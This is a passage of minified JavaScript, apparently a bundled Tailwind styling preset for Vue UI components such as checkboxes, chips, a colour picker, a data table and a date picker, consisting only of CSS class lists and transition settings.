      "bg-surface-0 dark:bg-surface-900"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, pu = {
  root: {
    class: [
      "relative",
      // Alignment
      "inline-flex",
      "align-bottom",
      // Size
      "w-5",
      "h-5",
      // Misc
      "cursor-pointer",
      "select-none"
    ]
  },
  box: ({ props: e, context: t }) => ({
    class: [
      // Alignment
      "flex",
      "items-center",
      "justify-center",
      // Size
      "w-5",
      "h-5",
      // Shape
      "rounded",
      "border",
      // Colors
      {
        "border-surface-300 dark:border-surface-700": !t.checked && !e.invalid,
        "bg-surface-0 dark:bg-surface-950": !t.checked && !e.invalid && !e.disabled,
        "border-secondary-400 bg-secondary-400": t.checked
      },
      // Invalid State
      "invalid:focus:ring-danger-400",
      "invalid:hover:border-danger-400",
      { "border-danger-400 dark:border-danger-400": e.invalid },
      // States
      {
        "peer-hover:border-surface-400 dark:peer-hover:border-surface-600": !e.disabled && !t.checked && !e.invalid,
        "peer-hover:bg-primary-emphasis peer-hover:border-primary-emphasis": !e.disabled && t.checked,
        "peer-focus-visible:z-10 peer-focus-visible:outline-none peer-focus-visible:outline-offset-0 peer-focus-visible:ring-1 peer-focus-visible:ring-primary-500 dark:peer-focus-visible:ring-secondary-200": !e.disabled,
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      },
      {
        "[&>svg]:text-primary-contrast [&>svg]:w-[0.875rem] [&>svg]:h-[0.875rem]": t.checked
      },
      // Transitions
      "transition-colors",
      "duration-200"
    ]
  }),
  input: {
    class: [
      "peer",
      // Size
      "w-full ",
      "h-full",
      // Position
      "absolute",
      "top-0 left-0",
      "z-10",
      // Spacing
      "p-0",
      "m-0",
      // Shape
      "opacity-0",
      "rounded",
      "outline-none",
      "border border-surface-300 dark:border-surface-700",
      // Misc
      "appearance-none",
      "cursor-pointer"
    ]
  },
  icon: ({ context: e, state: t }) => ({
    class: [
      // Size
      "w-[0.875rem]",
      "h-[0.875rem]",
      // Colors
      {
        "text-primary-contrast": e.checked,
        "text-primary": t.d_indeterminate
      },
      // Transitions
      "transition-all",
      "duration-200"
    ]
  })
}, bu = {
  root: {
    class: [
      // Flexbox
      "inline-flex items-center",
      // Spacing
      "px-3 py-1 gap-2",
      // Shape
      "rounded-[16px]",
      // Colors
      "text-surface-700 dark:text-white",
      "bg-surface-100 dark:bg-surface-700"
    ]
  },
  label: {
    class: "leading-6 m-0"
  },
  icon: {
    class: "leading-6 mr-2"
  },
  image: {
    class: ["w-8 h-8 -ml-2 mr-2", "rounded-full"]
  },
  removeIcon: {
    class: [
      "inline-block",
      // Shape
      "rounded-md leading-6",
      // Size
      "w-4 h-4",
      // Transition
      "transition duration-200 ease-in-out",
      // Misc
      "cursor-pointer"
    ]
  }
}, gu = {
  root: ({ props: e }) => ({
    class: [
      // Display
      "inline-block",
      // Misc
      {
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  preview: {
    class: [
      // Font
      "text-base leading-none",
      // Spacing
      "m-0",
      "p-0",
      //Size
      "w-6 h-6",
      // Shape
      "rounded-md",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-300 dark:border-surface-700",
      // States
      "hover:border-surface-400 dark:hover:border-surface-600",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      // Transition
      "transition-colors duration-200",
      // Misc
      "cursor-pointer"
    ]
  },
  panel: ({ props: e }) => ({
    class: [
      // Position & Size
      {
        "relative h-[166px] w-[193px]": e.inline,
        "absolute h-[166px] w-[193px]": !e.inline
      },
      // Shape
      "shadow-md border",
      // Colors
      "bg-surface-800 dark:bg-surface-900 border-surface-600 dark:border-surface-700"
    ]
  }),
  colorSelector: {
    class: [
      // Position
      "absolute top-[8px] left-[8px]",
      // Size
      "h-[150px] w-[150px]"
    ]
  },
  colorbackground: {
    class: [
      // Size
      "h-[150px] w-[150px]"
    ],
    style: "background:linear-gradient(to top,#000 0%,rgba(0,0,0,0) 100%),linear-gradient(to right,#fff 0%,rgba(255,255,255,0) 100%)"
  },
  colorHandle: {
    class: [
      "absolute",
      // Shape
      "rounded-full border border-solid",
      // Size
      "h-[10px] w-[10px]",
      // Spacing
      "-ml-[5px] -mt-[5px]",
      // Colors
      "border-white",
      // Misc
      "cursor-pointer opacity-85"
    ]
  },
  hue: {
    class: [
      // Position
      "absolute top-[8px] left-[167px]",
      // Size
      "h-[150px] w-[17px]",
      // Opacity
      "opacity-85"
    ],
    style: "background: linear-gradient(0deg, red 0, #ff0 17%, #0f0 33%, #0ff 50%, #00f 67%, #f0f 83%, red)"
  },
  hueHandle: {
    class: [
      // Position
      "absolute left-0 -ml-[2px] -mt-[5px]",
      // Size
      "h-[10px] w-[21px]",
      // Shape
      "border-solid border-2",
      // Misc
      "cursor-pointer opacity-85"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, hu = {
  icon: "w-8 h-8 text-[2rem] mr-2"
}, mu = {
  root: {
    class: [
      // Shape
      "rounded-lg",
      "shadow-lg",
      "border-0",
      // Positioning
      "z-40 transform origin-center",
      "mt-3 absolute left-0 top-0",
      '[&[data-p-confirmpopup-flipped="true"]]:mb-3 [&[data-p-confirmpopup-flipped="true"]]:-mt-3',
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80",
      // Before: Arrow
      "before:absolute before:w-0 before:-top-3 before:h-0 before:border-transparent before:border-solid before:ml-[10px] before:border-x-[10px] before:border-b-[10px] before:border-t-0 before:border-b-surface-200 dark:before:border-b-surface-700",
      "after:absolute after:w-0 after:-top-[0.54rem] after:left-[4px] after:h-0 after:border-transparent after:border-solid after:ml-[8px] after:border-x-[8px] after:border-b-[8px] after:border-t-0 after:border-b-surface-0 dark:after:border-b-surface-900",
      // Flipped: Arrow
      '[&[data-p-confirmpopup-flipped="true"]]:before:-bottom-3 [&[data-p-confirmpopup-flipped="true"]]:before:top-auto [&[data-p-confirmpopup-flipped="true"]]:before:border-b-0 [&[data-p-confirmpopup-flipped="true"]]:before:border-t-[10px] [&[data-p-confirmpopup-flipped="true"]]:before:border-t-surface-200 dark:[&[data-p-confirmpopup-flipped="true"]]:before:border-t-surface-700',
      '[&[data-p-confirmpopup-flipped="true"]]:after:-bottom-[0.54rem] [&[data-p-confirmpopup-flipped="true"]]:after:top-auto [&[data-p-confirmpopup-flipped="true"]]:after:border-b-0 [&[data-p-confirmpopup-flipped="true"]]:after:border-t-[8px] [&[data-p-confirmpopup-flipped="true"]]:after:border-t-surface-0 dark:[&[data-p-confirmpopup-flipped="true"]]:after:border-t-surface-900'
    ]
  },
  content: {
    class: [
      "p-4 items-center flex",
      "rounded-t-lg",
      "border-x border-t last:border-b border-surface-200 dark:border-surface-700"
    ]
  },
  icon: {
    class: "text-2xl mr-4"
  },
  footer: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-end",
      "shrink-0",
      "text-right",
      "gap-2",
      // Spacing
      "px-4",
      "pb-4",
      // Shape
      "border-t-0",
      "rounded-b-lg",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80",
      "border-x border-b border-surface-200 dark:border-surface-700"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, xu = {
  root: {
    class: [
      // Sizing and Shape
      "min-w-[12.5rem]",
      "rounded-md",
      "shadow-md",
      // Spacing
      "p-1",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      "border border-surface-200 dark:border-surface-700"
    ]
  },
  rootList: {
    class: [
      // Spacings and Shape
      "flex flex-col",
      "list-none",
      "m-0",
      "p-0",
      "outline-none"
    ]
  },
  item: {
    class: "relative my-[2px] [&:first-child]:mt-0"
  },
  itemContent: ({ context: e }) => ({
    class: [
      //Shape
      "rounded-[4px]",
      // Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-100 dark:bg-[rgba(255,255,255,0.03)]": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // Transitions
      "transition-shadow",
      "duration-200",
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Disabled
      { "opacity-60 pointer-events-none cursor-default": e.disabled }
    ]
  }),
  itemLink: {
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Misc
      "no-underline",
      "overflow-hidden",
      "cursor-pointer",
      "select-none"
    ]
  },
  itemIcon: {
    class: [
      // Spacing
      "mr-2"
    ]
  },
  itemLabel: {
    class: ["leading-none"]
  },
  submenu: ({ props: e }) => ({
    class: [
      "flex flex-col",
      // Size
      "w-full sm:w-48",
      // Spacing
      "p-1",
      "m-0",
      "list-none",
      // Shape
      "shadow-md",
      "rounded-md",
      "dark:border dark:border-surface-700",
      // Position
      "static sm:absolute",
      "z-10",
      { "sm:absolute sm:left-full sm:top-0": e.level > 1 },
      // Color
      "bg-surface-0 dark:bg-surface-900"
    ]
  }),
  submenuIcon: {
    class: ["ml-auto"]
  },
  separator: {
    class: "border-t border-surface-200 dark:border-surface-700"
  },
  transition: {
    enterFromClass: "opacity-0",
    enterActiveClass: "transition-opacity duration-250"
  }
}, vu = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      { "flex flex-col": e.scrollable && e.scrollHeight === "flex" },
      // Size
      { "h-full": e.scrollable && e.scrollHeight === "flex" }
    ]
  }),
  mask: {
    class: [
      // Position
      "absolute",
      "top-0 left-0",
      "z-20",
      // Flex & Alignment
      "flex items-center justify-center",
      // Size
      "w-full h-full",
      // Color
      "bg-surface-100/40 dark:bg-surface-900/40",
      // Transition
      "transition duration-200"
    ]
  },
  loadingIcon: {
    class: "w-8 h-8 animate-spin"
  },
  tableContainer: ({ props: e }) => ({
    class: [
      {
        relative: e.scrollable,
        "flex flex-col grow": e.scrollable && e.scrollHeight === "flex"
      },
      // Size
      { "h-full": e.scrollable && e.scrollHeight === "flex" }
    ]
  }),
  header: ({ props: e }) => ({
    class: [
      "font-bold",
      // Shape
      e.showGridlines ? "border-x border-t border-b-0" : "border-y border-x-0",
      // Spacing
      "p-4",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700",
      "text-surface-700 dark:text-white/80"
    ]
  }),
  table: {
    class: "w-full border-spacing-0 border-separate"
  },
  thead: ({ context: e }) => ({
    class: [
      {
        "bg-surface-0 dark:bg-surface-900 top-0 z-40 sticky": e.scrollable
      }
    ]
  }),
  tbody: ({ instance: e, context: t }) => ({
    class: [
      {
        "sticky z-20": e.frozenRow && t.scrollable
      },
      "bg-surface-0 dark:bg-surface-800"
    ]
  }),
  tfoot: ({ context: e }) => ({
    class: [
      {
        "bg-surface-0 bottom-0 z-0": e.scrollable
      }
    ]
  }),
  footer: {
    class: [
      "font-bold",
      // Shape
      "border-t-0 border-b border-x-0 dark:border-b-0",
      // Spacing
      "p-4",
      // Color
      "bg-surface-0 dark:bg-surface-800",
      "border-surface-200 dark:border-surface-700",
      "text-surface-700 dark:text-white/80"
    ]
  },
  column: {
    headerCell: ({ context: e, props: t }) => ({
      class: [
        "font-semibold dark:font-normal",
        "leading-[normal]",
        // Position
        { "sticky z-20 border-b": t.frozen || t.frozen === "" },
        { relative: e.resizable },
        // Alignment
        "text-left",
        // Shape
        { "first:border-l border-y border-r": e == null ? void 0 : e.showGridlines },
        "border-x-0 border-y-2 border-solid",
        // Spacing
        (e == null ? void 0 : e.size) === "small" ? "py-[0.375rem] px-2" : (e == null ? void 0 : e.size) === "large" ? "py-[0.9375rem] px-5" : "py-3 px-4",
        // Color
        (t.sortable === "" || t.sortable) && e.sorted ? "bg-highlight" : "bg-surface-50 text-surface-700 dark:text-surface-0/50 dark:bg-surface-800/50",
        "border-surface-200 dark:border-surface-900",
        // States
        {
          "hover:bg-surface-100 dark:hover:bg-surface-800/50": (t.sortable === "" || t.sortable) && !(e != null && e.sorted)
        },
        "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
        // Transition
        { "transition duration-200": t.sortable === "" || t.sortable },
        // Misc
        { "cursor-pointer": t.sortable === "" || t.sortable },
        {
          "overflow-hidden whitespace-nowrap border-y bg-clip-padding": e == null ? void 0 : e.resizable
          // Resizable
        }
      ]
    }),
    columnHeaderContent: {
      class: "flex items-center gap-2"
    },
    sort: ({ context: e }) => ({
      class: [
        e.sorted ? "text-primary-500" : "text-surface-700",
        e.sorted ? "dark:text-primary-400" : "dark:text-white/80"
      ]
    }),
    bodyCell: ({ props: e, context: t, state: r, parent: o }) => {
      var s, n, i;
      return {
        class: [
          // Font
          "leading-[normal]",
          //Position
          { "sticky box-border border-b": o.instance.frozenRow },
          {
            "sticky box-border border-b z-20": e.frozen || e.frozen === ""
          },
          // Alignment
          "text-left",
          // Shape
          "border-0 border-b dark:border-b-0 border-solid",
          { "first:border-l border-r border-b": t == null ? void 0 : t.showGridlines },
          {
            "bg-surface-0 dark:bg-surface-900": o.instance.frozenRow || e.frozen || e.frozen === ""
          },
          // Spacing
          {
            "py-[0.375rem] px-2": (t == null ? void 0 : t.size) === "small" && !r.d_editing
          },
          {
            "py-[0.9375rem] px-5": (t == null ? void 0 : t.size) === "large" && !r.d_editing
          },
          {
            "py-3 px-4": (t == null ? void 0 : t.size) !== "large" && (t == null ? void 0 : t.size) !== "small" && !r.d_editing
          },
          { "py-[0.6rem] px-2": r.d_editing },
          // Color
          "border-surface-200 dark:border-surface-700",
          {
            "overflow-hidden whitespace-nowrap border-y bg-clip-padding": (i = (n = (s = o.instance) == null ? void 0 : s.$parentInstance) == null ? void 0 : n.$parentInstance) == null ? void 0 : i.resizableColumns
            // Resizable
          }
        ]
      };
    },
    footerCell: ({ context: e }) => ({
      class: [
        // Font
        "font-bold",
        // Alignment
        "text-left",
        // Shape
        "border-0 border-b border-solid",
        { "border-x border-y": e == null ? void 0 : e.showGridlines },
        // Spacing
        (e == null ? void 0 : e.size) === "small" ? "p-2" : (e == null ? void 0 : e.size) === "large" ? "p-5" : "p-4",
        // Color
        "border-surface-200 dark:border-surface-700",
        "text-surface-700 dark:text-white/80",
        "bg-surface-0 dark:bg-surface-900"
      ]
    }),
    sortIcon: ({ context: e }) => ({
      class: [
        "ml-2",
        e.sorted ? "text-inherit" : "text-surface-700 dark:text-white/70"
      ]
    }),
    columnFilter: {
      class: "inline-flex items-center ml-auto font-normal"
    },
    filterOverlay: {
      class: [
        "flex flex-col gap-2",
        // Position
        "absolute top-0 left-0",
        // Shape
        "border-0 dark:border",
        "rounded-md",
        "shadow-md",
        // Size
        "min-w-[12.5rem]",
        // Color
        "bg-surface-0 dark:bg-surface-900",
        "text-surface-800 dark:text-white/80",
        "dark:border-surface-700"
      ]
    },
    filterConstraintList: {
      class: "m-0 p-0 py-3 list-none"
    },
    filterConstraint: ({ context: e }) => ({
      class: [
        // Font
        "font-normal",
        "leading-none",
        // Position
        "relative",
        // Shape
        "border-0",
        "rounded-none",
        // Spacing
        "m-0",
        "py-3 px-5",
        // Color
        { "text-surface-700 dark:text-white/80": !(e != null && e.highlighted) },
        {
          "bg-surface-0 dark:bg-surface-900 text-surface-700 dark:text-white/80": !(e != null && e.highlighted)
        },
        { "bg-highlight": e == null ? void 0 : e.highlighted },
        //States
        {
          "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !(e != null && e.highlighted)
        },
        {
          "hover:text-surface-700 hover:bg-surface-100 dark:hover:text-white dark:hover:bg-[rgba(255,255,255,0.03)]": !(e != null && e.highlighted)
        },
        "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
        // Transitions
        "transition-shadow",
        "duration-200",
        // Misc
        "cursor-pointer",
        "overflow-hidden",
        "whitespace-nowrap"
      ]
    }),
    filterOperator: {
      class: [
        // Shape
        "rounded-t-md",
        // Color
        "text-surface-700 dark:text-white/80",
        "bg-surface-0 dark:bg-surface-700",
        "[&>[data-pc-name=pcfilteroperatordropdown]]:w-full"
      ]
    },
    filter: ({ instance: e }) => ({
      class: [
        {
          "flex items-center w-full gap-2": e.display === "row",
          "inline-flex ml-auto": e.display === "menu"
        }
      ]
    }),
    filterRule: "flex flex-col gap-2",
    filterButtonbar: "flex items-center justify-between p-0",
    filterAddButtonContainer: "[&>[data-pc-name=pcfilteraddrulebutton]]:w-full",
    rowToggleButton: {
      class: [
        "relative",
        // Flex & Alignment
        "inline-flex items-center justify-center",
        "text-left",
        // Spacing
        "m-0 p-0",
        // Size
        "w-8 h-8",
        // Shape
        "border-0 rounded-full",
        // Color
        "text-surface-500 dark:text-white/70",
        "bg-transparent",
        "focus-visible:outline-none focus-visible:outline-offset-0",
        "focus-visible:ring-1 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
        // Transition
        "transition duration-200",
        // Misc
        "overflow-hidden",
        "cursor-pointer select-none"
      ]
    },
    columnResizer: {
      class: [
        "block",
        // Position
        "absolute top-0 right-0",
        // Sizing
        "w-2 h-full",
        // Spacing
        "m-0 p-0",
        // Color
        "border border-transparent",
        // Misc
        "cursor-col-resize"
      ]
    },
    transition: {
      class: "p-4 flex flex-col gap-2",
      enterFromClass: "opacity-0 scale-y-[0.8]",
      enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
      leaveActiveClass: "transition-opacity duration-100 ease-linear",
      leaveToClass: "opacity-0"
    }
  },
  bodyRow: ({ context: e, props: t, parent: r }) => ({
    class: [
      // Color
      { "bg-highlight": e.selected },
      {
        "bg-surface-0 text-surface-600 dark:text-white/80 dark:bg-surface-900": !e.selected
      },
      { "font-bold bg-surface-0 dark:bg-surface-900 z-20": t.frozenRow },
      {
        "odd:bg-surface-0 odd:text-surface-600 dark:odd:text-surface-0 dark:even:text-surface-0 dark:odd:bg-surface-800 even:bg-surface-50 even:text-surface-600 dark:even:bg-surface-900": e.stripedRows && !e.selected
      },
      // State
      {
        "hover:bg-surface-300/20 dark:hover:bg-surface-700/50": t.selectionMode && !e.selected || r.instance.rowHover
      },
      // Transition
      {
        "transition duration-200": t.selectionMode && !e.selected || t.rowHover
      },
      // Misc
      { "cursor-pointer": t.selectionMode || r.instance.rowHover }
    ]
  }),
  rowExpansion: {
    class: "bg-surface-0 dark:bg-surface-900 text-surface-600 dark:text-white/80"
  },
  rowGroupHeader: {
    class: [
      "sticky z-20",
      "bg-surface-0 text-surface-600 dark:text-white/70",
      "dark:bg-surface-900"
    ]
  },
  rowGroupFooter: {
    class: [
      "sticky z-20",
      "bg-surface-0 text-surface-600 dark:text-white/70",
      "dark:bg-surface-900"
    ]
  },
  rowToggleButton: {
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      "text-left",
      // Spacing
      "m-0 p-0",
      // Size
      "w-8 h-8",
      // Shape
      "border-0 rounded-full",
      // Color
      "text-surface-500 dark:text-white/70",
      "bg-transparent",
      "focus-visible:outline-none focus-visible:outline-offset-0",
      "focus-visible:ring-1 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
      // Transition
      "transition duration-200",
      // Misc
      "overflow-hidden",
      "cursor-pointer select-none"
    ]
  },
  rowToggleIcon: {
    class: "inline-block w-4 h-4"
  },
  columnResizeIndicator: {
    class: "absolute hidden w-[2px] z-20 bg-primary"
  }
}, yu = {
  content: {
    class: [
      // Spacing
      "p-0",
      // Shape
      "border-0",
      // Color
      "text-surface-700 dark:text-white/80",
      "bg-surface-0 dark:bg-surface-900"
    ]
  },
  header: {
    class: [
      "font-semibold",
      // Spacing
      "py-3 px-4",
      // Color
      "text-surface-800 dark:text-white/80",
      "bg-surface-00 dark:bg-surface-900",
      "border-b border-surface-200 dark:border-surface-700"
    ]
  }
}, qs = {
  root: ({ props: e }) => ({
    class: [
      // Display and Position
      {
        flex: e.fluid,
        "inline-flex": !e.fluid
      },
      "max-w-full",
      "relative"
    ]
  }),
  pcInput: ({ props: e, parent: t }) => {
    var r;
    return {
      root: {
        class: [
          // Display
          "flex-auto w-[1%]",
          // Font
          "leading-none",
          // Colors
          "text-surface-600 dark:text-surface-200",
          "placeholder:text-surface-400 dark:placeholder:text-surface-500",
          { "bg-surface-0 dark:bg-surface-950": !e.disabled },
          "border",
          { "border-surface-300 dark:border-surface-600": !e.invalid },
          // Invalid State
          "invalid:focus:ring-red-200",
          "invalid:hover:border-red-500",
          { "border-red-500 dark:border-red-400": e.invalid },
          // Spacing
          "m-0 py-2 px-3",
          // Shape
          "appearance-none",
          { "rounded-md": !e.showIcon || e.iconDisplay == "input" },
          {
            "rounded-l-md  flex-1 pr-9": e.showIcon && e.iconDisplay !== "input"
          },
          {
            "rounded-md flex-1 pr-9": e.showIcon && e.iconDisplay === "input"
          },
          // Transitions
          "transition-colors",
          "duration-200",
          // States
          {
            "hover:border-surface-400 dark:hover:border-surface-600": !e.disabled && !e.invalid,
            "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10": !e.disabled,
            "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
          },
          // Filled State *for FloatLabel
          {
            filled: ((r = t.instance) == null ? void 0 : r.$name) == "FloatLabel" && e.modelValue !== null
          }
        ]
      }
    };
  },
  dropdownIcon: {
    class: [
      "absolute top-1/2 -mt-2",
      "text-surface-600 dark:text-surface-200",
      "right-3"
    ]
  },
  dropdown: {
    class: [
      "relative",
      // Alignments
      "items-center inline-flex text-center align-bottom justify-center",
      // Shape
      "rounded-r-md",
      // Size
      "py-2 px-0",
      "w-10",
      "leading-[normal]",
      // Colors
      "border border-l-0 border-surface-300 dark:border-surface-600",
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring-1",
      "hover:bg-primary-hover hover:border-primary-hover",
      "focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  },
  inputIconContainer: "absolute cursor-pointer top-1/2 right-3 -mt-3",
  inputIcon: "inline-block text-base",
  panel: ({ props: e }) => ({
    class: [
      // Display & Position
      {
        absolute: !e.inline,
        "inline-block": e.inline
      },
      // Size
      { "w-auto p-3 ": !e.inline },
      { "min-w-[80vw] w-auto p-3 ": e.touchUI },
      { "p-3 min-w-full": e.inline },
      // Shape
      "border rounded-lg",
      {
        "shadow-md": !e.inline
      },
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700",
      //misc
      { "overflow-x-auto": e.inline }
    ]
  }),
  header: {
    class: [
      //Font
      "font-medium",
      // Flexbox and Alignment
      "flex items-center justify-between",
      // Spacing
      "p-0 pb-2",
      "m-0",
      // Shape
      "border-b",
      "rounded-t-md",
      // Colors
      "text-surface-700 dark:text-white/80",
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700"
    ]
  },
  title: {
    class: [
      // Text
      "leading-7",
      "mx-auto my-0"
    ]
  },
  selectMonth: {
    class: [
      // Font
      "text-base leading-[normal]",
      "font-medium",
      //shape
      "rounded-md",
      // Colors
      "text-surface-700 dark:text-white/80",
      // Transitions
      "transition duration-200",
      // Spacing
      "p-1",
      "m-0 mr-2",
      // States
      "hover:text-primary-500 dark:hover:text-primary-400",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      // Misc
      "cursor-pointer"
    ]
  },
  selectYear: {
    class: [
      // Font
      "text-base leading-[normal]",
      "font-medium",
      //shape
      "rounded-md",
      // Colors
      "text-surface-700 dark:text-white/80",
      // Transitions
      "transition duration-200",
      // Spacing
      "p-1",
      "m-0 mr-2",
      // States
      "hover:text-primary-500 dark:hover:text-primary-400",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      // Misc
      "cursor-pointer"
    ]
  },
  table: {
    class: [
      // Font
      "text-base leading-[normal]",
      // Size & Shape
      "border-collapse",
      "w-full",
      // Spacing
      "m-0 mt-2"
    ]
  },
  tableHeaderCell: {
    class: [
      // Spacing
      "p-1",
      "font-medium"
    ]
  },
  weekHeader: {
    class: [
      "leading-5",
      "text-surface-600 dark:text-white/70",
      "opacity-60 cursor-default"
    ]
  },
  weekNumber: {
    class: ["text-surface-600 dark:text-white/70", "opacity-60 cursor-default"]
  },
  weekday: {
    class: [
      // Colors
      "text-surface-500 dark:text-white/60",
      "p-1"
    ]
  },
  dayCell: {
    class: [
      // Spacing
      "p-1"
    ]
  },
  weekLabelContainer: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-center",
      "mx-auto",
      // Shape & Size
      "w-8 h-8",
      "rounded-full",
      "border-transparent border",
      "leading-[normal]",
      // Colors
      "opacity-60 cursor-default"
    ]
  },
  dayView: "w-full",
  day: ({ context: e }) => ({
    class: [
      // Flexbox and Alignment
      "flex items-center justify-center",
      "mx-auto",
      // Shape & Size
      "w-8 h-8",
      "rounded-full",
      "border-transparent border",
      "leading-[normal]",
      // Colors
      {
        "bg-surface-100 dark:bg-surface-800 text-surface-600 dark:text-white/70": e.date.today && !e.selected && !e.disabled,
        "bg-transparent text-surface-600 dark:text-white/70": !e.selected && !e.disabled && !e.date.today,
        "bg-highlight": e.selected && !e.disabled
      },
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      {
        "hover:bg-surface-50 dark:hover:bg-surface-500/10": !e.selected && !e.disabled
      },
      {
        "opacity-60 cursor-default": e.disabled,
        "cursor-pointer": !e.disabled
      }
    ]
  }),
  monthView: {
    class: [
      // Spacing
      "mt-2"
    ]
  },
  month: ({ context: e }) => ({
    class: [
      // Flexbox and Alignment
      "inline-flex items-center justify-center",
      // Size
      "w-1/3",
      "p-1",
      // Shape
      "rounded-md",
      // Colors
      {
        "text-surface-600 dark:text-white/70 bg-transparent": !e.selected && !e.disabled,
        "bg-highlight": e.selected && !e.disabled
      },
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.selected && !e.disabled
      },
      // Misc
      "cursor-pointer"
    ]
  }),
  yearView: {
    class: [
      // Spacing
      "mt-2"
    ]
  },
  year: ({ context: e }) => ({
    class: [
      // Flexbox and Alignment
      "inline-flex items-center justify-center",
      // Size
      "w-1/2",
      "p-1",
      // Shape
      "rounded-md",
      // Colors
      {
        "text-surface-600 dark:text-white/70 bg-transparent": !e.selected && !e.disabled,
        "bg-highlight": e.selected && !e.disabled
      },
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10",
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.selected && !e.disabled
      },
      // Misc
      "cursor-pointer"
    ]
  }),
  timePicker: {
    class: [
      // Flexbox
      "flex",
      "justify-center items-center",
      // Borders
      "border-t-1",
      "border-solid border-surface-200",
      // Spacing
      "pt-2 mt-2"
    ]
  },
  separatorContainer: {
    class: [
      // Flexbox and Alignment
      "flex",
      "items-center",
      "flex-col",
      // Spacing
      "px-2"
    ]
  },
  separator: {
    class: [
      // Text
      "text-xl"
    ]
  },
  hourPicker: {
    class: [
      // Flexbox and Alignment
      "flex",
      "items-center",
      "flex-col",
      // Spacing
      "px-2"
    ]
  },
  minutePicker: {
    class: [
      // Flexbox and Alignment
      "flex",
      "items-center",
      "flex-col",
      // Spacing
      "px-2"
    ]
  },
  secondPicker: {
    class: [
      // Flexbox and Alignment
      "flex",
      "items-center",
      "flex-col",
      // Spacing
      "px-2"
    ]
  },
  ampmPicker: {
    class: [
      // Flexbox and Alignment
      "flex",
      "items-center",
      "flex-col",
      // Spacing
      "px-2"
    ]
  },
  calendarContainer: "flex",
  calendar: "flex-auto border-l first:border-l-0 border-surface-200",
  buttonbar: {
    class: [
      // Flexbox
      "flex justify-between items-center",
      // Spacing
      "pt-2",
      // Shape
      "border-t border-surface-200 dark:border-surface-700"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, ku = {
  root: {}
}, wu = {
  root: ({ state: e }) => ({
    class: [
      // Shape
      "rounded-lg",
      "shadow-lg",
      "border-0",
      // Size
      "max-h-[90vh]",
      "m-0",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "[&:last-child]:border-b",
      "border-surface-200 dark:border-surface-700",
      // Transitions
      "transform",
